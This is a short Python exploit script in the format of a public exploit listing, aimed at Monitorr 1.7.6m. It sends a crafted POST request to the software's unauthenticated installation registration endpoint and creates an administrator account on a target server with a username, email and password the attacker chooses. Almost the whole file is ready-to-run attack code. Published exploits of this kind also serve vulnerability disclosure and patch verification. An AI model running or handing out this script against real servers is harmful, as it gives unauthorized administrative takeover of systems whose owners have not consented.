#!/usr/bin/python
# -*- coding: UTF-8 -*-

# Exploit Title: Monitorr 1.7.6m - Authorization Bypass
# Date: September 12, 2020
# Exploit Author: Lyhin's Lab
# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
# Software Link: https://github.com/Monitorr/Monitorr
# Version: 1.7.6m
# Tested on: Ubuntu 19

# Monitorr 1.7.6m allows creation of administrative accounts by abusing the installation URL.

import requests
import os
import sys

if len (sys.argv) != 5:
	print ("specify params in format: python " + sys.argv[0] + " target_url user_login user_email user_password")
else:
    url = sys.argv[1] + "/assets/config/_installation/_register.php?action=register"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": url, "Connection": "close", "Referer": url, "Upgrade-Insecure-Requests": "1"}
    data = {"user_name": sys.argv[2], "user_email": sys.argv[3], "user_password_new": sys.argv[4], "user_password_repeat": sys.argv[4], "register": "Register"}
    requests.post(url, headers=headers, data=data,verify=False)
    print ("Done.")